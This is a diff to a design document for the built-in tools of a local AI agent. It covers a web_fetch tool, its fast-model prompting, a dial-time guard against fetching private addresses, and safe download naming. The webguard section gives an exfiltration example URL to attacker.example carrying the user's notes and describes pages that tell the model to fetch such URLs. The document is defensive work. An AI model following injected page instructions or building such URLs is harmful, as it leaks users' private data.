@@ -1,10 +1,10 @@
 # builtin
 
 **Code:** `internal/builtin/` (`doc.go`, `builtin.go`, `remember.go`,
-`writefile.go`, `files.go`, `web.go`, and the tests `builtin_test.go`,
-`writefile_test.go`, `files_test.go` and `web_test.go`, with the PDF in
-`testdata/`)
-**Milestone:** v0.3 (`configure`, `web_search`, `web_url_read`), v0.4
+`writefile.go`, `files.go`, `web.go`, `webguard.go`, `webdownload.go`, and the
+tests `builtin_test.go`, `writefile_test.go`, `files_test.go`, `web_test.go` and
+`webfetch_test.go`, with the PDF in `testdata/`)
+**Milestone:** v0.3 (`configure`, `web_search`, `web_fetch`), v0.4
 (`remember`, `write_file`, `read_file`, `list_folder`, `grep`)
 **Architecture:** [First run and setup](../../ARCHITECTURE.md#first-run-and-setup),
 [Approving a tool call](../../ARCHITECTURE.md#approving-a-tool-call),
@@ -42,8 +42,13 @@ the `[index] folders`, with the indexer's own skip rules.
 When you ask "search the web for the latest Go release", the model calls
 `web_search` with `{"query": "latest Go release"}`. The tool sends one GET to the
 SearXNG you run on `127.0.0.1:8888` and hands back numbered results with their
-URLs. With `[web] read_pages = true`, the model can also call `web_url_read` with
-a URL from those results, to read the page itself.
+URLs. Then it calls `web_fetch` with one of those URLs and a prompt, such as
+`{"url": "https://go.dev/doc/devel/release", "prompt": "List the newest releases
+with their dates."}`. `web_fetch` reads the page and asks the fast model the
+question, and the model gets back one line that starts `From
+https://go.dev/doc/devel/release (fetched 2026-09-24):`. Without a prompt it gets
+the page's text; with `save` the file lands in `~/meru-output/downloads/`. A URL
+that neither a search result nor your own question showed asks you first.
 
 ## The picture
 
@@ -92,8 +97,11 @@ hook does nothing. A `nil` memory store leaves `remember` out, and an empty
 tools out; the tests of `configure` use all three. `merud` expands the `~` in
 `[skills] output_dir` before it calls `New`, so this package gets an absolute
 path, and it passes a `nil` indexer when `[index] folders` is empty. An empty
-`searxng_url` leaves `web_search` out, and `read_pages = false`, the default,
-leaves `web_url_read` out.
+`searxng_url` leaves `web_search` out, and `fetch = false` leaves `web_fetch`
+out; `fetch` is on by default. After `New`, `merud` calls `UseModel(eng,
+cfg.Models.Fast)`, so `web_fetch` can answer a prompt with the fast model. It is
+a method, not one more parameter of `New`, so the many tests that build `Tools`
+without a model stay as they are.
 
 `Confirm` decides whether a call asks first:
 
@@ -294,7 +302,7 @@ cut to 300 characters, and `Published 2026-02-10.` when SearXNG sends a date.
 result with no date, and a pointer can hold "no value" where a plain string
 can't.
 
-**`web_url_read`** fetches a public page, so it guards where it connects. The
+**`web_fetch`** fetches a public page, so it guards where it connects. The
 check sits in the dialer, the part of the HTTP client that opens the TCP
 connection:
 
@@ -323,27 +331,129 @@ between a check and the connection has no gap to use.
 the multicast ones. Two blocks netip doesn't flag sit in `privateRanges`:
 0.0.0.0/8, which reaches this machine on Linux, and 100.64.0.0/10, which carrier
 NAT and VPNs such as Tailscale use. `Unmap` first turns `::ffff:127.0.0.1` back
-into `127.0.0.1`. A refusal is a `*notPublicError`; `fetch` finds it inside the
+into `127.0.0.1`. A refusal is a `*notPublicError`; `get` finds it inside the
 errors the HTTP client wraps around it with `errors.As`, and shows the model its
 reason alone.
 
-After the fetch, the `Content-Type` header picks the reader. The tool checks it
-before it reads the body, so a refused type costs no download:
+The page client has no `Timeout` of its own. Each call puts a deadline on its
+`ctx` with `context.WithTimeout`: 20 seconds for a page, 2 minutes for a
+download. The deadline covers the body as well as the headers, and one client
+serves both modes with the same dialer and redirect rule.
+
+`webFetch` checks the arguments, then picks one of three modes:
+
+| Arguments | What happens |
+| --- | --- |
+| `url` alone, or with `offset` | `fetchPage`, then 12,000 characters of text from `offset`, as `read_file` pages a file |
+| `url` and `prompt` | `fetchPage`, then `answerFromPage` asks the fast model |
+| `url` and `save: true` | `download` saves the body in the downloads folder |
+
+`fetchPage` checks the `Content-Type` header before it reads the body, so a
+refused type costs no download, then `pageText` picks the reader:
 
 | Content type | Reader |
 | --- | --- |
 | `text/html`, `application/xhtml+xml` | `index.HTMLText`, the indexer's reader, which also returns the `<title>` |
 | `application/pdf` | `index.PDFText`, from the bytes in memory; no temporary file |
 | `text/plain` | as it is |
-| anything else | refused, naming the type |
+| anything else | refused, naming the type and pointing at `save` |
 
-The body stops at 5 MiB. Paging works as in `read_file`: runes, 12,000 per call,
-and a closing line with the next `offset`. Each call fetches the page again,
-because a cache would be one more thing to keep fresh and to size. The header names the final URL after redirects, the title
-and the size.
+The body stops at 5 MiB. Each call fetches the page again, because a cache would
+be one more thing to keep fresh and to size.
 
-Both tools answer `ConfirmNever` unless `[builtin] confirm` lists them, like the
-file tools.
+**The prompt.** `answerFromPage` takes up to 48,000 characters from `offset`,
+about 12,000 tokens, and sends two messages to the fast model: a four-rule
+system message (`fetchInstructions`: answer only from the page, quote numbers,
+versions and dates exactly, compare dates for "latest", say when the page doesn't
+say) and a user message with the question, the page and the question again. The
+options are the ones the skill pick uses:
+
+```go
+engine.Options{Model: w.fastModel, MaxTokens: answerTokens, Temperature: &zero, NoThink: true}
+```
+
+It wraps the call in `obs.StartChat`, the `gen_ai.chat` span the agent's own
+model calls use. `ctx` already carries `dispatch`'s `meru.dispatch` span, so the
+new span nests under it with no extra wiring. The result reads
+`From <final URL> (fetched <date>): <answer>`, and when the page has text past
+what the model read, it says which characters the answer covers and gives the
+offset for the rest. The tokens don't join the turn's usage: the router and the
+skill pick, the other fast-model calls in a turn, don't either, and carrying
+counts back would widen `dispatch.Result` for one tool. The span records them.
+
+The live test on the `lite` model showed the limit of a 2B model here. On
+go.dev's release history, which lists go1.27.1 under a go1.27.0 heading, it
+answered "go1.27.0" to "what is the latest release?" at temperature 0 with
+thinking off, whatever the instructions said. Asked to "list the newest entries
+with their dates", it listed both, and the main model could pick. The
+`web-research` skill tells the model to ask that way.
+
+### webguard.go
+
+A URL can carry data out: `https://attacker.example/?notes=<your notes>`. A page
+the model reads can tell it to fetch one. So `web_fetch` runs without asking only
+for a URL the session has seen before, from a trusted place:
+
+- `webSearch` adds each result URL it shows to the session's set, with the
+  session from `dispatch.SessionFrom(ctx)`, as `remember` gets it;
+- `ConfirmCall` adds each URL in `Call.Question`, which the agent fills with the
+  user's words: this turn's question and the earlier questions in the history.
+
+`dispatch` asks a backend's `ConfirmCall` before `Confirm` when the backend has
+one (see [dispatch](dispatch.md)). For `web_fetch`, it answers:
+
+| The call | Answer | Choices the user sees |
+| --- | --- | --- |
+| a URL the session doesn't know | `ConfirmAlways` | once, deny |
+| `save` on a known URL | `ConfirmAsk` | once, session, deny |
+| a known URL, no `save` | `ok = false`: `Confirm` decides | none, unless `[builtin] confirm` lists `web_fetch` |
+
+An unknown URL never gets a session choice: after one yes, every later made-up
+URL would pass. A scheduled job has nobody to ask, so `dispatch` declines the
+first two rows there.
+
+`normalizeURL` makes the comparison fair: scheme and host in lower case, the
+fragment gone, an empty path written as `/`. The query stays, because the query
+is where data would travel. `questionURLs` finds URLs in the question with one
+regular expression and trims the punctuation that ends a sentence, keeping a
+`)` that has a partner inside the URL, as in Wikipedia's
+`Go_(programming_language)`.
+
+The sets live in `knownURLs`, a map from session to set with a `sync.Mutex`,
+because one round's calls run side by side. `merud` runs for weeks and every
+chat leaves a set, so the map has a cap: at most 256 sessions, and when a new
+one would pass that, `dropOldest` removes the session used longest ago. A walk
+over 256 entries costs less than keeping a second structure in order. One
+session holds at most 2,000 URLs. The sets end with `merud`, as session
+approvals do; after a restart the user's questions come back through the
+history, and a search-result URL asks once.
+
+### webdownload.go
+
+`download` uses the same `get` as a fetch, so the dial check, the redirect cap
+and the no-cookie rule hold, with a 50 MiB cap and a 2-minute deadline instead
+of 5 MiB and 20 seconds:
+
+1. `downloadName` picks the name: the `filename` in `Content-Disposition`, parsed
+   with `mime.ParseMediaType`, or the URL's last path part. It keeps only the part
+   after the last `/` or `\`, so `../../.ssh/authorized_keys` becomes
+   `authorized_keys`; turns anything but ASCII letters, digits, `.`, `-` and `_`
+   into `_`; drops leading dots, so no download is hidden; and cuts the name to
+   100 characters. An empty result becomes `download`.
+2. `openDownloads` creates the output folder and `downloads` inside it with mode
+   `0700`, refuses a `downloads` that is a symbolic link or a file, and returns an
+   `os.Root` on it.
+3. `saveNew` opens `report.pdf`, then `report-2.pdf`, `report-3.pdf` and so on,
+   each with `O_CREATE|O_EXCL`. That flag makes the open fail when anything has
+   the name, a symbolic link included, so the write never goes through a link or
+   over a file. It copies at most 50 MiB plus one byte; one byte over means the
+   file is too large, and a deferred function removes it.
+4. `previewText` reads back an HTML, PDF or text file of 5 MiB or less and returns
+   its first 2,000 characters for the result.
+
+`merud` calls `index.ReadAlso` on the downloads folder, so `read_file` and `grep`
+reach it under the indexer's own rules (see [index](index.md)). The indexer never
+scans it, so a downloaded page can't reach a later turn through search.
 
 ## Go ideas used here
 
@@ -351,6 +461,10 @@ file tools.
   and the `Transport`, which holds the proxy setting and the dialer. Each web tool
   builds its own, so one tool's rules can't leak into the other's. More in
   [go-basics/http-clients.md](go-basics/http-clients.md).
+- **`context.WithTimeout`** — returns a `ctx` that ends after a time, and a
+  `cancel` function to call when done (`defer cancel()`). `web_fetch` uses it to
+  give a page 20 seconds and a download 2 minutes on one client. More in
+  [go-basics/context.md](go-basics/context.md).
 - **The dialer's `Control` hook** — a function `net.Dialer` calls with the
   resolved address before it connects; returning an error stops the connection.
 - **`net/netip`** — small value types for IP addresses and prefixes, with tests
@@ -360,9 +474,12 @@ file tools.
   [go-basics/errors.md](go-basics/errors.md).
 
 - **Interfaces** — `Tools` has the six methods of `dispatch.Backend`, so
-  `dispatch` can hold it next to the MCP pool. The test line
-  `var _ dispatch.Backend = (*Tools)(nil)` fails to compile if a method goes
-  missing. More in [go-basics/interfaces.md](go-basics/interfaces.md).
+  `dispatch` can hold it next to the MCP pool, and the one method of
+  `dispatch.CallConfirmer`. The test lines
+  `var _ dispatch.Backend = (*Tools)(nil)` and its `CallConfirmer` twin fail to
+  compile if a method goes missing. `Generator` is an interface with the one
+  engine method `web_fetch` calls, defined here, where it is used. More in
+  [go-basics/interfaces.md](go-basics/interfaces.md).
 - **Struct tags and `encoding/json`** — `configureArgs` maps the JSON keys to
   fields. More in [go-basics/json.md](go-basics/json.md) and
   [go-basics/struct-tags.md](go-basics/struct-tags.md).
@@ -391,15 +508,32 @@ SearXNG sends with JSON off, a `200` HTML page, no results, a `500`, and each ba
 argument. `TestWebSearchQuery` checks the query string, `time_range` included,
 and `TestWebSearchRefused` points the tool at a closed port.
 
-`TestWebURLRead` serves pages from an `httptest` server on `127.0.0.1` and swaps
+`TestWebFetch` serves pages from an `httptest` server on `127.0.0.1` and swaps
 `allowAddr` so that this one address and port count as public; every other
 address still goes through the real `checkPublic`. It covers HTML with its title,
 a PDF, plain text, paging, a redirect, a cookie that mustn't come back, a refused
 content type, the 5 MiB cap, a 404, a redirect loop, and refusals of a second
 server on `127.0.0.1`, of a redirect to it, of `::1`, `192.168.1.1` and
-`169.254.169.254`. `TestWebURLReadNameToLoopback` keeps the real check and asks
+`169.254.169.254`. `TestWebFetchNameToLoopback` keeps the real check and asks
 for `http://localhost:<port>/`, a DNS name that resolves to `127.0.0.1`, and
 checks the server never saw a request. `TestCheckPublic` pins the address table.
+
+`webfetch_test.go` covers what `web_fetch` adds. `TestWebFetchPrompt` answers
+with a fake model and checks the result line, the options (fast model,
+`NoThink`, temperature 0), the two messages, the 48,000-character cap on a
+longer page and the offset that reads on. `TestWebFetchPromptFails` checks a
+missing model, a failing one, and that the raw path doesn't call the model.
+`TestWebFetchGuard` runs calls through a real `dispatch.Dispatcher` with a fake
+SearXNG whose result links to the page server: a search-result URL and a
+question URL run without asking; a made-up URL and one with notes in its query
+ask, offering once and deny; `dispatch` declines a job's call; and a URL known in one session
+asks in another. `TestNormalizeURL`, `TestQuestionURLs` and
+`TestKnownURLsBound` pin the helpers and the cap. `TestWebFetchSaveAsks`,
+`TestDownloadName`, `TestWebFetchSave` and `TestWebFetchSaveSymlinks` cover
+downloads: the choices, the job, the names, `-2` and `-3`, the 50 MiB cap with
+nothing left behind, and both kinds of planted link. `TestReadDownloads` reads
+and greps a downloaded file through `index.ReadAlso`, and refuses a link in the
+folder.
 
 `TestConfigure` runs the tool against a temporary config: catalog entries with and
 without their keys, custom commands and URLs, and each kind of bad argument. It
@@ -445,6 +579,12 @@ one-folder searches, and PDF pages. `TestGrepLimits` sets tiny limits on a
 - **Web search built in, not an MCP server.** SearXNG answers one GET with JSON.
   The MCP wrapper for it would add Node.js, an npm package and a child process
   per start; `web.go` is one file of Go.
+- **Ask about URLs, not pages.** Blocking bad pages would need a list nobody can
+  keep. A URL the user or a search showed can't carry anything the model
+  learned, so those run freely, and everything else asks.
+- **A per-call hook in dispatch, not a second path.** `ConfirmCall` changes only
+  the answer to "does this call ask?". The call still goes through `Dispatch`,
+  with its transcript lines, row, metrics and span.
 - **The address check at dial time.** Checking the URL's host before the request
   would miss a name that resolves inside the network, and a redirect. `Control`
   sees the one address that matters, the one the socket connects to.
